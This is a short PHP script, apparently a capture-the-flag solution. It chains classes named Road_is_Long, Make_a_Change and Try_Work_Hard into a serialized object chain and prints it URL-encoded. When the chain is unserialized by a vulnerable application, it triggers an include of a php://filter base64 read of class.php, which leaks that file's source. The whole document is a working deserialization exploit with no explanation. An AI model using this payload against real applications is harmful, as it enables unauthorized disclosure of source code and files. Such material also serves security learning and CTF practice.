<?php
 
class Try_Work_Hard{
    protected  $var='php://filter/read=convert.base64-encode/resource=class.php';
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    } 
}
 
class Road_is_Long{
    public $page;
    public $string;
    }
class Make_a_Change{
    public $effort;
    public function __construct(){
        $this->effort = array();
    }
 
    public function __get($key){
        $function = $this->effort;
        return $function();
    }
} 
$a = new Road_is_Long();
$b=new Road_is_Long();
$c=new Make_a_Change();
$d=new Try_Work_Hard();
$a->page=$b;
$b->string=$c;
$c->effort=$d;
echo urlencode(serialize($a));
 
 
?>